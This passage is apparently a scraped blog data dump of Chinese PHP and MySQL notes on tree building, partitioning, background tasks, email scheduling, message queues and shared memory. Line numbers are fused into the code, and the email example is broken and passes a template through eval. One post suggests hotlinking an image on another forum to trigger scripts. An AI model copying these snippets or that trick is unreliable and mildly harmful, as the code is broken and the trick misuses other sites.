mysql_fetch_assoc($rs)) &#123; list($id, $pid) = array_values($row); $ind[$id] = $row; if(isset($ind[$pid])) $ind[$pid][&apos;child&apos;][$id] =&amp; $ind[$id]; //构造索引 if($pid == 0) $res[$id] =&amp; $ind[$id]; //转存根节点组&#125;echo &apos;&lt;xmp&gt;&apos; . print_r($res, 1); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586Array( [1] =&gt; Array ( [id] =&gt; 1 [pid] =&gt; 0 [title] =&gt; Food [child] =&gt; Array ( [2] =&gt; Array ( [id] =&gt; 2 [pid] =&gt; 1 [title] =&gt; Fruit [child] =&gt; Array ( [3] =&gt; Array ( [id] =&gt; 3 [pid] =&gt; 2 [title] =&gt; Red [child] =&gt; Array ( [4] =&gt; Array ( [id] =&gt; 4 [pid] =&gt; 3 [title] =&gt; Cherry ) ) ) [5] =&gt; Array ( [id] =&gt; 5 [pid] =&gt; 2 [title] =&gt; Yellow [child] =&gt; Array ( [6] =&gt; Array ( [id] =&gt; 6 [pid] =&gt; 5 [title] =&gt; Banana ) ) ) ) ) [7] =&gt; Array ( [id] =&gt; 7 [pid] =&gt; 1 [title] =&gt; Meat [child] =&gt; Array ( [8] =&gt; Array ( [id] =&gt; 8 [pid] =&gt; 7 [title] =&gt; Beef ) [9] =&gt; Array ( [id] =&gt; 9 [pid] =&gt; 7 [title] =&gt; Pork ) ) ) ) )) 来自：http://bbs.csdn.net/topics/390364669","categories":[{"name":"php","slug":"php","permalink":"http://ningmo.github.io/categories/php/"}],"tags":[]},{"title":"批量更新表中的某个字段","slug":"mysql/批量更新表中的某个字段","date":"2013-03-03T05:24:44.000Z","updated":"2019-08-26T06:09:54.322Z","comments":true,"path":"2013/03/03/mysql/批量更新表中的某个字段/","link":"","permalink":"http://ningmo.github.io/2013/03/03/mysql/批量更新表中的某个字段/","excerpt":"","text":"mysql中批量修改某一个字段 类似于批量替换语句中的一部分内容例如批量修改字段filepath中的 “/ly/“ 为 “/“ 1update 表名 set filepath=replace(filepath,&quot;&quot;/ly/&quot;,&quot;/&quot;); 注：此语句不会影响”/ly/“两侧的内容","categories":[{"name":"mysql","slug":"mysql","permalink":"http://ningmo.github.io/categories/mysql/"}],"tags":[]},{"title":"sql快速生成大量数据","slug":"mysql/sql快速生成大量数据","date":"2013-01-31T02:50:28.000Z","updated":"2019-08-26T06:09:54.322Z","comments":true,"path":"2013/01/31/mysql/sql快速生成大量数据/","link":"","permalink":"http://ningmo.github.io/2013/01/31/mysql/sql快速生成大量数据/","excerpt":"","text":"123insert into table(a,b,c,d) values(1,2,3,4)然后重复执行以下sql语句 没执行一次 数据就会倍增insert into table(a,b,c,d) (select a,b,c,d from table) 注意：上句中为避免可能有自增主键的存在而没有使用（*），还有使用时注意唯一性约束导致报错。","categories":[],"tags":[]},{"title":"mysql分表hash方式","slug":"mysql/mysql分表hash方式","date":"2013-01-31T02:37:51.000Z","updated":"2019-08-26T06:09:54.320Z","comments":true,"path":"2013/01/31/mysql/mysql分表hash方式/","link":"","permalink":"http://ningmo.github.io/2013/01/31/mysql/mysql分表hash方式/","excerpt":"","text":"HASH分区主要用来确保数据在预先确定数目的分区中平均分布。在RANGE和LIST分区中，必须明确指定一个给定的列值或列值集合应该保存在哪个分区中；而在HASH分区中，MySQL 自动完成这些工作，你所要做的只是基于将要被哈希的列值指定一个列值或表达式，以及指定被分区的表将要被分割成的分区数量。要使用HASH分区来分割一个表，要在CREATE TABLE 语句上添加一个“PARTITION BY HASH (expr)”子句，其中“expr”是一个返回一个整数的表达式。它可以仅仅是字段类型为MySQL 整型的一列的名字。此外，你很可能需要在后面再添加一个“PARTITIONS num”子句，其中num 是一个非负的整数，它表示表将要被分割成分区的数量。例如，下面的语句创建了一个使用基于“store_id”列进行 哈希处理的表，该表被分成了4个分区： 1234567891011CREATE TABLE employees ( id INT NOT NULL, fname VARCHAR(30), lname VARCHAR(30), hired DATE NOT NULL DEFAULT &apos;1970-01-01&apos;, separated DATE NOT NULL DEFAULT &apos;9999-12-31&apos;, job_code INT, store_id INT)PARTITION BY HASH(store_id)PARTITIONS 4； 如果没有包括一个PARTITIONS子句，那么分区的数量将默认为1。 例外： 对于NDB Cluster（簇）表，默认的分区数量将与簇数据节点的数量相同，这种修正可能是考虑任何MAX_ROWS 设置，以便确保所有的行都能合适地插入到分区中。（参见第17章：MySQL簇）。如果在关键字“PARTITIONS”后面没有加上分区的数量，将会出现语法错误。“expr”还可以是一个返回一个整数的SQL表达式。例如，也许你想基于雇用雇员的年份来进行分区。这可以通过下面的语句来实现： 1234567891011CREATE TABLE employees ( id INT NOT NULL, fname VARCHAR(30), lname VARCHAR(30), hired DATE NOT NULL DEFAULT &apos;1970-01-01&apos;, separated DATE NOT NULL DEFAULT &apos;9999-12-31&apos;, job_code INT, store_id INT)PARTITION BY HASH(YEAR(hired))PARTITIONS 4； “expr”还可以是MySQL 中有效的任何函数或其他表达式，只要它们返回一个既非常数、也非随机数的整数。（换句话说，它既是变化的但又是确定的）。但是应当记住，每当插入或更新（或者可能删除）一行，这个表达式都要计算一次；这意味着非常复杂的表达式可能会引起性能问题，尤其是在执行同时影响大量行的运算（例如批量插入）的时候。最有效率的哈希函数是只对单个表列进行计算，并且它的值随列值进行一致地增大或减小，因为这考虑了在分区范围上的“修剪”。也就是说，表达式值和它所基于的列的值变化越接近，MySQL就可以越有效地使用该表达式来进行HASH分区。例如，“date_col” 是一个DATE（日期）类型的列，那么表达式TO_DAYS(date_col)就可以说是随列“date_col”值的变化而发生直接的变化，因为列“date_col”值的每个变化，表达式的值也将发生与之一致的变化。而表达式YEAR(date_col)的变化就没有表达式TO_DAYS(date_col)那么直接，因为不是列“date_col”每次可能的改变都能使表达式YEAR(date_col)发生同等的改变。即便如此，表达式YEAR(date_col)也还是一个用于 哈希函数的、好的候选表达式，因为它随列date_col的一部分发生直接变化，并且列date_col的变化不可能引起表达式YEAR(date_col)不成比例的变化。作为对照，假定有一个类型为整型（INT）的、列名为“int_col”的列。现在考虑表达式“POW(5-int_col,3) + 6”。这对于哈希函数就是一个不好的选择，因为“int_col”值的变化并不能保证表达式产生成比例的变化。列 “int_col”的值发生一个给定数目的变化，可能会引起表达式的值产生一个很大不同的变化。例如，把列“int_col”的值从5变为6，表达式的值将产生“－1”的改变，但是把列“int_col”的值从6变为7时，表达式的值将产生“－7”的变化。换句话说，如果列值与表达式值之比的曲线图越接近由等式“y=nx（其中n为非零的常数）描绘出的直线，则该表达式越适合于 哈希。这是因为，表达式的非线性越严重，分区中数据产生非均衡分布的趋势也将越严重。理论上讲，对于涉及到多列的表达式，“修剪（pruning）”也是可能的，但是要确定哪些适于 哈希是非常困难和耗时的。基于这个原因，实际上不推荐使用涉及到多列的哈希表达式。当使用了“PARTITION BY HASH”时，MySQL将基于用户函数结果的模数来确定使用哪个编号的分区。换句话，对于一个表达式“expr”，将要保存记录的分区编号为N ，其中“N = MOD(expr, num)”。例如，假定表t1 定义如下，它有4个分区：CREATE TABLE t1 (col1 INT, col2 CHAR(5), col3 DATE) PARTITION BY HASH( YEAR(col3) ) PARTITIONS 4；如果插入一个col3列值为’2005-09-15’的记录到表t1中，那么保存该条记录的分区确定如下：MOD(YEAR(‘2005-09-01’),4)= MOD(2005,4)= 1MySQL 5.1 还支持一个被称为“linear hashing（线性哈希功能）”的变量，它使用一个更加复杂的算法来确定新行插入到已经分区了的表中的位置。关于这种算法的描述，请参见18.2.3.1节，“LINEAR HASH分区” 。每当插入或更新一条记录，用户函数都要计算一次。当删除记录时，用户函数也可能要进行计算，这取决于所处的环境。注释：如果将要分区的表有一个唯一的键，那么用来作为HASH用户函数的自变数或者主键的column_list的自变数的任意列都必须是那个键的一部分。","categories":[],"tags":[]},{"title":"php多线程","slug":"php/php多线程","date":"2013-01-31T02:33:10.000Z","updated":"2019-08-26T06:09:54.327Z","comments":true,"path":"2013/01/31/php/php多线程/","link":"","permalink":"http://ningmo.github.io/2013/01/31/php/php多线程/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phperror_reporting(E_ALL &amp; ~E_NOTICE);/** * @title: PHP多线程类(Thread) * @version: 1.0 * @author: phper.org.cn &lt; web@phper.org.cn &gt; * @published: 2010-11-2 * * PHP多线程应用示例： * require_once &apos;thread.class.php&apos;; * $thread = new thread(); * $thread-&gt;addthread(&apos;action_log&apos;,&apos;a&apos;); * $thread-&gt;addthread(&apos;action_log&apos;,&apos;b&apos;); * $thread-&gt;addthread(&apos;action_log&apos;,&apos;c&apos;); * $thread-&gt;runthread(); * * function action_log($info) &#123; * $log = &apos;log/&apos; . microtime() . &apos;.log&apos;; * $txt = $info . &quot;\\r\\n\\r\\n&quot; . &apos;Set in &apos; . Date(&apos;h:i:s&apos;, time()) . (double)microtime() . &quot;\\r\\n&quot;; * $fp = fopen($log, &apos;w&apos;); * fwrite($fp, $txt); * fclose($fp); * &#125; */class thread &#123; var $hooks = array(); var $args = array(); #var $address=&apos;&apos;; function thread() &#123; #$this-&gt;address=$address; &#125; function addthread($func) &#123; $args = array_slice(func_get_args(), 1); $this-&gt;hooks[] = $func; $this-&gt;args[] = $args; return true; &#125; function runthread() &#123; if(isset($_GET[&apos;flag&apos;])) &#123; $flag = intval($_GET[&apos;flag&apos;]); &#125; if($flag || $flag === 0) &#123; call_user_func_array($this-&gt;hooks[$flag], $this-&gt;args[$flag]); &#125; else &#123; for($i = 0, $size = count($this-&gt;hooks); $i &lt; $size; $i++) &#123; /* if($this-&gt;address) &#123; $addr=$this-&gt;address; &#125; else &#123; $addr=$_SERVER[&apos;HTTP_HOST&apos;]; &#125; */ $fp=fsockopen($_SERVER[&apos;HTTP_HOST&apos;],$_SERVER[&apos;SERVER_PORT&apos;]); if($fp) &#123; $out = &quot;GET &#123;$_SERVER[&apos;PHP_SELF&apos;]&#125;?flag=$i HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: &#123;$_SERVER[&apos;HTTP_HOST&apos;]&#125;\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; fputs($fp,$out); fclose($fp); &#125; &#125; &#125; &#125;&#125;","categories":[],"tags":[]},{"title":"php定时执行任务的几个方法","slug":"php/php定时执行任务的几个方法","date":"2013-01-23T06:45:16.000Z","updated":"2019-08-26T06:09:54.327Z","comments":true,"path":"2013/01/23/php/php定时执行任务的几个方法/","link":"","permalink":"http://ningmo.github.io/2013/01/23/php/php定时执行任务的几个方法/","excerpt":"","text":"PHP的实现决定了它没有Java和.Net这种AppServer的概念, 而http协议是一个无状态的协议, php只能被用户触发, 被调用, 调用后会自动退出内存, 没有常驻内存, 就没有办法准确的定时处理那么, 如果需要用PHP定时执行某些任务的话, 可以有以下俩个方法:Linux下crontab, windows下计划任务找个被频繁调用的网页, 里面加上一个检测代码set_time_limit(0);ignore_user_abort(true);死循环 第一个方法是最常见的, 如果php服务器上没有权限去crontab, 也可以找一个自己的机器定期crontab去请求服务器第二种方法, 论坛上定时清理新帖基本上就是这么实现的, 如果人气不旺的话, 可以考虑去别的火爆点的论坛里面发个图片, 调用自己的php来实现一个trigger就好了。 Discuz!是判断在00:00之后,第一个执行者去执行的。第三种比较不靠谱, Apache重启了就得重新访问, fastcgi倒是会好一点。下面的这段代码，可以在当前文件夹下，生成一个test.txt，并每隔20秒，往里面写入一个时间戳，无论客户端是否关闭浏览器。 123456789101112131415161718192021&lt;?phpignore_user_abort(true);set_time_limit(0);function write_txt()&#123;if(!file_exists(”test.txt”))&#123;$fp = fopen(”test.txt”,”wb”);fclose($fp);&#125;$str = file_get_contents(’test.txt’);$str .= “\\r\\n”.date(”H:i:s”);$fp = fopen(”test.txt”,”wb”);fwrite($fp,$str);fclose($fp);&#125;function do_cron()&#123;usleep(20000000);write_txt();&#125;while(1)&#123;do_cron();&#125; 关键的两个函数：ignore_user_abort(true)，这个函数的作用是，无论客户端是否关闭浏览器，下面的代码都将得到执行。set_time_limit(0)，这个函数的作用是，取消php文件的执行时间，如果没有这个函数的话，默认php的执行时间是30秒，也就是说30秒后，这个文件就say goodbay了。另外usleep在PHP5.0之后，支持windows操作系统。我们在做一个php 邮件发送问题是常常会遇见这样的问题，就是用户订阅一些资料需要定时发送到用户的邮箱中去。去网上搜索了一下，发现在这样的文章不多，本文介绍了一种用PHP实现的方法，笔者用PHP的时间不长，欢迎大家PP。 一、要实现定时发送，主要解决问题是定时。 我们在写程序时需要加个什么if 某个时间＝某个时间则发送，可是要实现这个过程，面临的问题是，我们要执行这个页面才能发送。所以主要解决的问题是怎么到时让服务器定时执行这个页面，这样实现起来好像比较困难。 二、我翻开PHP手册，找到了PHP 的命令行模式这一章，发现能解决这一问题，建议大家如果想用这个方法的话先看看这一章。 三、解决方法：1、在 Windows 平台下您可以将cli\\php.exe 和 .php 文件的双击属性相关联，您也可以编写一个批处理文件来用 PHP 执行脚本。我们把写好的程序放在一个目录下如 E:\\web\\mail.php然后写一个windows批处理文件内容如下。@D:\\php\\cli\\php.exe E:\\web\\mail.php &gt;d:\\php\\cli\\sendmail.logPause那个D:\\php\\cli\\php.exe是我的PHP安装文件所在目录。Php.exe就是windows PHP命令行模式的程序。好的，我们保存这个文件为mail.bat然后的windows中的计划任务中添加一个任务，让操作系统在某个时间来运行这个批处理文件。2、如果您使用 Unix 系统，您需要在您的 PHP 脚本的最前面加上一行特殊的代码，使得它能够被执行，这样系统就能知道用什么样的程序要运行该脚本。为 Unix 系统增加的第一行代码不会影响该脚本在 Windows 下的运行，因此您也可以用该方法编 写跨平台的脚本程序。以下是一个简单的PHP 命令行程序的范例。 四、例子：E:\\web \\Timesend.php #!/usr/bin/php 123456789101112131415161718192021222324252627282930313233343536&lt;?php require_once(&quot;E:\\web\\includes\\config.php&quot;); require_once(&quot;E:\\web\\includes\\class\\mail.class.php&quot;); require_once(&quot;E:\\web\\includes\\class\\smtp.class.php&quot;); // +----------------------------------------------------+//数据库配置 $dbhost = &quot;localhost&quot;; $dbport = &quot;3306&quot;; $dbname = &quot;&quot;; $dbuser = &quot;&quot;; $dbpawd = &quot;&quot;;// +----------------------------------------------------+//数据库连接对象 $db = new dbLink($dbhost,$dbport,$dbuser,$dbpawd,$dbname); $query = &quot;SELECT * FROM wl_mailtemplate WHERE mt_name = &apos;UserUpdate&apos;&quot;; $mailtemplate =$db-&gt;dbQuery($query); $username = &apos;sdfsdfdsd&apos;; $sex = &quot;先生&quot;; $accounts = &quot;sdfasdfasdfsad&quot;; $password = &quot;sdfsadfsdasdasddssfds&quot;; $message = &quot; $message = addslashes($message); eval_r(&quot;\\$message = \\&quot;$message\\&quot;;&quot;); $mail = new SendMail(&apos;wfits@126.com&apos;, $mailtemplate[0][&apos;mt_subject&apos;], nl2br($message)); if ($mail-&gt;Send()) &#123; $feedback = &quot;修改确认信息已发送到您的注册Email，当前登录已被注销。\\\\n请注意查收确认信，并取得新的登录密码。&quot;; echo $feedback; &#125;?&gt; 写个bat文件。@D:\\php\\cli\\php.exe E:\\web\\mail.php &gt;d:\\php\\cli\\sendmail.logPause保存为：timesend.bat放在@D:\\php\\cli\\php.exe目录下在window中添加计划任务，然后就可以啦！ 五、说明。 1、 我发送邮件用的是模板在数据库中存着，还有两个邮件发送类就不提供了，要的话可以联系我。 2、 在使用requrie_once时要用绝对路径。 3、 PHP 的命令行模式能使得 PHP 脚本能完全独立于 WEB 服务器单独运行，所以要是大量发送邮件时就能减轻服务器负担。 4、 再一次建议大家看看PHP手册 第23. 章PHP 的命令行模式。 其实这不是真正的实现邮件自动发送的方法，但是在无桌面应用程序中的ＷＥＢ方式下，这可能是一个比较好的方式吧～！，我想那种真正实现邮件自动发送的系统，在服务器端还是有一个桌面应用程序做支撑的！所以说这种实现邮件的自动发送仅仅是实现ＰＨＰ程序发送邮件的一种方法！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061 &quot; . $mailtemplate[0][&apos;mt_message&apos;]. &quot;&quot;;&lt;?phpignore_user_abort(); // 即使Client断开(如关掉浏览器)，PHP脚本也可以继续执行.set_time_limit(0); // 执行时间为无限制，php默认的执行时间是30秒，通过set_time_limit(0)可以让程序无限制的执行下去$interval=20; // 时间间隔 单位 秒$key_file=&quot;key.txt&quot;; // 配置文件if (isset($_GET[&apos;s&apos;]))&#123; if ($_GET[&apos;s&apos;]==&quot;0&quot;)&#123; // 停止工作，但不退出 $s=&quot;false&quot;; echo &quot;Function is off&quot;; &#125; elseif ($_GET[&apos;s&apos;]==&quot;1&quot;)&#123; // 工作 $s=&quot;true&quot;; echo &quot;Function is on&quot;; &#125; elseif ($_GET[&apos;s&apos;]==&quot;2&quot;)&#123; // 退出 $s=&quot;die&quot;; echo &quot;Function exited&quot;; &#125; else die(&quot;Err 0:stop working 1:working 2:exit&quot;); $string = &quot;&lt;?php\\n return \\&quot;&quot;.$s.&quot;\\&quot;;\\n?&gt;&quot;; write_inc($key_file,$string,true); exit();&#125;if(file_exists($key_file))&#123; do&#123; $mkey = include $key_file; if ($mkey==&quot;true&quot;)&#123; // 如果工作 ///////////////////// 工作区间 ////////////////////////////////// $showtime=date(&quot;Y-m-d H:i:s&quot;); $fp = fopen(&apos;func.txt&apos;,&apos;a&apos;); fwrite($fp,$showtime.&quot;\\n&quot;); fclose($fp); /////////////////////////////////////////////////////////////////// &#125; elseif ($mkey==&quot;die&quot;)&#123; // 如果退出 die(&quot;I am dying!&quot;); &#125; sleep($interval); // 等待$interval分钟 &#125;while(true);&#125;else die($key_file.&quot; doesn&apos;t exist !&quot;);function write_inc($path,$strings,$type=false)&#123; $path=dirname(__FILE__).&quot;/&quot;.$path; if ($type==false) file_put_contents($path,$strings,FILE_APPEND); else file_put_contents($path,$strings);&#125;?&gt; 原文:http://blbear.com/post/187","categories":[],"tags":[]},{"title":"php消息队列","slug":"php/php消息队列","date":"2013-01-23T06:31:09.000Z","updated":"2019-08-26T06:09:54.327Z","comments":true,"path":"2013/01/23/php/php消息队列/","link":"","permalink":"http://ningmo.github.io/2013/01/23/php/php消息队列/","excerpt":"","text":"首先既然是队列当然满足FIFO的性质。称它为消息队列是因为它是在多个进程中共享消息的机制。当然System V下还有信号量和共享内存等机制来完成进程间内容的共享。但是队列这个结构的性质非常适合完成系列连贯的任务，而且任务处理又有先后顺序的情形。PHP中用于消息队列的函数如下： 1234567int ftok ( string $pathname , string $proj ) //负责创建消息队列的keyresource msg_get_queue ( int $key [, int $perms ] ) //通过key来创建消息队列bool msg_queue_exists ( int $key ) //判断队列是否存在bool msg_remove_queue ( resource $queue ) //删除消息队列array msg_stat_queue ( resource $queue ) //获得队列状态信息，包括队列中还有多少消息未读等信息。bool msg_send ( resource $queue , int $msgtype , mixed $message [, bool $serialize [, bool $blocking [, int &amp;$errorcode ]]] ) //发送消息至消息队列bool msg_receive ( resource $queue , int $desiredmsgtype , int &amp;$msgtype , int $maxsize , mixed &amp;$message [, bool $unserialize [, int $flags [, int &amp;$errorcode ]]] ) //从消息队列中获取消息 下面我来具体说说msg_send和msg_receive，因为其他的函数使用起来都比较简单，看一下文档就可以了。msg_send在发送消息的时候可以指定可以msgtype的参数，这个参数是用来指定消息类型的，参数类型为数字型。使用这个参数我们可以在同一个消息队列中放置不同类型的消息，从而不必开辟多个消息队列。serialize参数来指定是否需要将消息变量进行序列化，序列化后我们就可以存放结构更为复杂的变量。而blocking参数用来指定在队列满后msg_send的动作，当blocking为true时，msg_send会挂起，等待消息队列中有足够的空间放置消息时再次发送消息。而如果blocking为false则在发现队列满后不执行send直接结束。msg_receive可以指定你需要从队列中取回的消息类型,即desiremsgtype，它会从队列中取出第一个满足此类型的消息。如果desiremsgtype为0，则不考虑类型，取出消息队列的第一个元素。它的值也可以为负值，此时返回的数据类型为小于此负值绝对值的最小值。例如你指定-5为希望的类型，那么如果有类型为1的消息则优先返回。若队列中没有符合的类型可以返回的话，此函数挂起等待相应类型加入队列后将其取出，若flag中有MSG_IPC_NOWAIT的话则立即返回。msgtype为一个引用传递参数，获取实际获得的消息类型。maxsize指定消息的最大长度，若消息长度超过最大长度则产生错误，若指定flag为MSG_NOERROR则消息会根据最大长度截取，并抑制错误的产生。unserialize用来指定是否需要解序列化。flag中还有一个标记是MSG_EXCEPT，通过配合desiremsgtype可以实现选择不是某种类型的消息。下面我们讨论如何通过消息队列实现PHP的多进程。因为消息队列是系统的公共存储空间，因此所有的php进程都可以访问。最简单的实现方法就是通过一个php将要处理的任务发送到消息队列中，然后通过开启子进程或者开启其他的php脚本来从消息队列中取出任务进行执行。开启进程的方法有好多，可以使用pcntl_fork来创建一个子进程，也可以再找一个php脚本来处理，通过pcntl_exec来启动。或者根本不管进程空间，直接exec()来开启一个php脚本来处理。我使用的方法是通过计数来开启其他php脚本处理。通过一个php取出要处理的任务，将其压入消息队列，每压入指定条数的消息就开启另一个php来处理消息队列的内容，直到所有要处理的任务都压入消息队列，主php结束执行。此时后台会有好多php脚本在执行消息队列中的任务，当消息队列为空则通过开启的php脚本将消息队列撤销，同时所有开启的php脚本结束。整个执行过程完成。当然我们也可以通过pcntl_fork函数将程序写的更简单一些，在主进程中将任务入队，每隔一定的任务数开启一个当前进程的子进程来处理入队的任务，直到消息队列为空时结束。","categories":[],"tags":[]},{"title":"php中对共享内存，消息队列的操作","slug":"php/php中对共享内存，消息队列的操作","date":"2013-01-16T15:22:54.000Z","updated":"2019-08-26T06:09:54.326Z","comments":true,"path":"2013/01/16/php/php中对共享内存，消息队列的操作/","link":"","permalink":"http://ningmo.github.io/2013/01/16/php/php中对共享内存，消息队列的操作/","excerpt":"","text":"php作为脚本程序，通常生命周期都很短，如在web应用中，一次请求就是php运行的一个周期，请求结束则生命周期截止。所以php在处理需要共 享的资源时，一般会将共享数据保存在数据库或dbm之类的文件中，再者就是利用内存实现共享。你可以选择已有的工具辅助你，像memcache；也可以自 己编写代码访问操作系统的共享内存段。 php中对共享内存段的操作有两组函数：System V IPC和Shared Memory。 其中System V IPC系列函数能够更方便的操作数据，无需像Shared Memory那样必须自己掌握读写时的偏移量、长度等，也不用序列化/反序列化来回转换（因为Shared Memory函数只支持字符串格式的数据参数）。但是System V IPC系列不支持Windows，所以如果要在win环境下使用，只能选Shared Memory。 因为php默认不支持这些函数，所以需要重编译php。如要使用：System V信号量，编译时加上 –enable-sysvsemSystem V共享内存，编译时加上 –enable-sysvshmSystem V消息队列，编译时加上 –enable-sysvmsgShared Memory，编译时加上 –enable-shmop 先写个Shared Memory的例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php$key = ftok(__FILE__, &apos;i&apos;);$size = 100;$shm_h = @shmop_open($key, &apos;c&apos;, 0644, $size);if($shm_h === false) &#123; echo &quot;shmop open failed&quot;; exit;&#125;$data = shmop_read($shm_h, 0, $size);$data = unserialize($data);//如果没有数据则写一个if(empty($data)) &#123; echo &quot;there is no data&quot;; $data = &quot;imdonkey&quot;; //就算数据是文本，write时也要序列化 $write_size = shmop_write($shm_h, serialize($data), 0); if($write_size === false) echo &quot;shmop write failed!&quot;;&#125;//如果有，显示出来，之后删掉else &#123; echo &quot;shared memory data: &quot;; print_r($data); shmop_delete($shm_h);&#125;shmop_close($shm_h);?&gt;再写个System V shm的例子：&lt;?php $shm_key = ftok(__FILE__, &apos;i&apos;);$memsize = 120;$shm_h = shm_attach($shm_key, $memsize, 0644);if($shm_h === false) &#123; echo &quot;shmop open failed&quot;; exit;&#125;$var_key = 3;$data = @shm_get_var($shm_h, $var_key);if(empty($data)) &#123; $data = &quot;imdonkey&quot;; echo &quot;there is no data, insert $data.\\n&quot;; shm_put_var($shm_h, $var_key, $data);&#125; else &#123; echo &quot;find data: $data\\n&quot;; shm_remove_var($shm_h, $var_key);&#125;shm_detach($shm_h);?&gt; 可以看到，sysV对于每个数据都另外设立了对应的var_key，这样在同一内存区域可以保存多个数据，而不用像shmop中那样再申请另外一个共享内存区域，还免除了序列化的干扰（虽然数据最终还是以序列化的形式保存，但不用开发者去手动实现）。 例子虽然简单，但也有一些需要注意的地方，不管是shm_attach还是shmop_open，所申请的内存的大小一定要满足后面数据的体积，这 个体积包括数据本身序列化后的长，还有php添加的少量header信息。php官方文档中有人提出了一种计算要申请的内存大小的公式，这个公式可以保证 所申请的内存足够存储一个指定的数据。公式如下： 12345//当shm_attach第一次被调用时，php向共享内存写入一个header$shmHeaderSize = (PHP_INT_SIZE * 4) + 8;//当shm_put_var调用时，php会在序列化后的数据前面，加一个header$shmVarSize = (((strlen(serialize($foo))+ (4 * PHP_INT_SIZE)) /4 ) * 4 ) + 4;$memsize = $shmHeaderSize + $shmVarSize; 这个公式是否适用于所有情况，我不敢说，所以我想最好还是在程序中，将准备放入共享内存的数据结构设计好，尽量保证数据大小在某一范围内。 还有就是为了防止共享内存被浪费，当数据无用时及时调用对应的remove方法释放资源。 介绍完共享内存再顺带提一下消息队列Message Queue（也是在System V IPC函数组中），消息队列似乎可以视为另一种共享内存，只是数据存储的方式有些不同。简单来说，就是每个key对应一个队列，每个队列可以保存多个数据，数据间按照先进先出的原则进行操作。php文档中的例子很好的介绍了各函数的应用： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php if ( sizeof($argv)&lt;2 ) &#123; echo &quot;Usage: $argv[0] stat|send|receive|remove msgType MSG [msg] \\n\\n&quot; ; echo &quot; EX: $argv[0] send 1 \\&quot;This is no 1\\&quot; \\n&quot; ; echo &quot; $argv[0] receive ID \\n&quot; ; echo &quot; $argv[0] stat \\n&quot; ; echo &quot; $argv[0] remove \\n&quot; ; exit; &#125; $MSGKey = &quot;123456&quot; ; $seg = msg_get_queue($MSGKey) ; switch ( $argv[1] ) &#123; case &quot;send&quot;: msg_send($seg, $argv[2], $argv[3]); echo &quot;msg_send done...\\n&quot; ; break; case &quot;receive&quot;: $stat = msg_stat_queue( $seg ); echo &apos;Messages in the queue: &apos;.$stat[&apos;msg_qnum&apos;].&quot;\\n&quot;; if ( $stat[&apos;msg_qnum&apos;]&gt;0 ) &#123; msg_receive($seg, $argv[2], $msgtype, 1024, $data, true, MSG_IPC_NOWAIT); var_dump($msgtype); var_dump($data); echo &quot;\\n&quot;; &#125; else &#123; echo &quot;No Msg...\\n&quot;; &#125; break; case &quot;stat&quot;: print_r( msg_stat_queue($seg) ); break; case &quot;remove&quot;: msg_remove_queue($seg); break; &#125; ?&gt; 消息队列中的数据同样受到大小的约束，具体约束范围可通过msg_stat_queue的msg_qbytes看到。这段代码唯一有点小改动的地方就在接受消息时，指定了MSG_IPC_NOWAIT，不然如果目标队列没有数据，默认会一直等待。 一般会用到共享内存或消息队列的情况，都会涉及到多线程/进程，或跨语言的数据传递。如果是php脚本/进程间共享数据，那只要小心点操作就没什么 问题。如果要求跨语言，那很可能遇到千奇百怪的问题，呵呵，我还没试过，但在网上看到别人发的苦水贴，以后有机会一定实验一下。 在调试共享内存、信号量、消息队列时，可以配合Linux系统命令观察数据存储情况及信号量、消息队列资源分配情况，如ipcs, ipcrm命令。 利用PHP操作Linux消息队列完成进程间通信 当我们开发的系统需要使用多进程方式运行时，进程间通信便成了至关重要的环节。消息队列（message queue）是Linux系统进程间通信的一种方式。 关于Linux系统进程通信的概念及实现可查看：http://www.ibm.com/developerworks/cn/linux/l-ipc/ 关于Linux系统消息队列的概念及实现可查看：http://www.ibm.com/developerworks/cn/linux/l-ipc/part4/ PHP的sysvmsg模块是对Linux系统支持的System V IPC中的System V消息队列函数族的封装。我们需要利用sysvmsg模块提供的函数来进进程间通信。先来看一段示例代码_1： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php $message_queue_key = ftok(__FILE__, &apos;a&apos;); $message_queue = msg_get_queue($message_queue_key, 0666);var_dump($message_queue); $message_queue_status = msg_stat_queue($message_queue);print_r($message_queue_status); //向消息队列中写msg_send($message_queue, 1, &quot;Hello,World!&quot;); $message_queue_status = msg_stat_queue($message_queue);print_r($message_queue_status); //从消息队列中读msg_receive($message_queue, 0, $message_type, 1024, $message, true, MSG_IPC_NOWAIT);print_r($message.&quot;\\r\\n&quot;); msg_remove_queue($message_queue); ?&gt; 这段代码的运行结果如下：resource(4) of type (sysvmsg queue)Array( [msg_perm.uid] =&gt; 1000 [msg_perm.gid] =&gt; 1000 [msg_perm.mode] =&gt; 438 [msg_stime] =&gt; 0 [msg_rtime] =&gt; 0 [msg_ctime] =&gt; 1279849495 [msg_qnum] =&gt; 0 [msg_qbytes] =&gt; 16384 [msg_lspid] =&gt; 0 [msg_lrpid] =&gt; 0)Array( [msg_perm.uid] =&gt; 1000 [msg_perm.gid] =&gt; 1000 [msg_perm.mode] =&gt; 438 [msg_stime] =&gt; 1279849495 [msg_rtime] =&gt; 0 [msg_ctime] =&gt; 1279849495 [msg_qnum] =&gt; 1 [msg_qbytes] =&gt; 16384 [msg_lspid] =&gt; 2184 [msg_lrpid] =&gt; 0)Hello,World! 可以看到已成功从消息队列中读取“Hello,World!”字符串 下面列举一下示例代码中的主要函数： ftok ( string $pathname , string $proj ) 手册上给出的解释是：Convert a pathname and a project identifier to a System V IPC key。这个函数返回的键值唯一对应linux系统中一个消息队列。在获得消息队列的引用之前都需要调用这个函数。 msg_get_queue ( int $key [, int $perms ] ) msg_get_queue() 会根据传入的键值返回一个消息队列的引用。如果linux系统中没有消息队列与键值对应，msg_get_queue()将会创建一个新的消息队列。函数 的第二个参数需要传入一个int值，作为新创建的消息队列的权限值，默认为0666。这个权限值与linux命令chmod中使用的数值是同一个意思，因为在linux系统中一切皆是文件。 msg_send ( resource $queue , int $msgtype , mixed $message [, bool $serialize [, bool $blocking [, int &amp;$errorcode ]]] ) 顾名思义，该函数用来向消息队列中写数据。 